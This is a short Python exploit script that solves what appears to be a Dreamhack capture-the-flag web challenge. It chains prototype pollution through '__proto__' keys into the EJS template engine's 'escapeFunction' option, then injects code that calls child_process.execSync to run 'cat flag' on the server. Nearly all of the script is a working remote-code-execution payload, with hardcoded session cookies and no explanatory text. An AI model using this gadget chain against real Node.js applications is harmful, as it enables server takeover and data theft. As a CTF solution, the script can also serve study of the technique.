import requests

url = "http://host1.dreamhack.games:13799"

res = requests.post(url + "/register", json={"username":"guest","password":"guest"})
print(res.text)

res = requests.get(url + "/api/set", params={"key":"[view options]__proto__[client]","value":"true"}, cookies={"uid":"0.999999999999999999999","password":"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec"})
print(res.text)

cmd = "cat flag"

res = requests.get(url + "/api/set", params={"key":"[view options]__proto__[escapeFunction]","value":"1;return global.process.mainModule.constructor._load('child_process').execSync('"+cmd+"');"}, cookies={"uid":"0.999999999999999999999","password":"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec"})
print(res.text)

res = requests.get(url + "/")
print(res.text)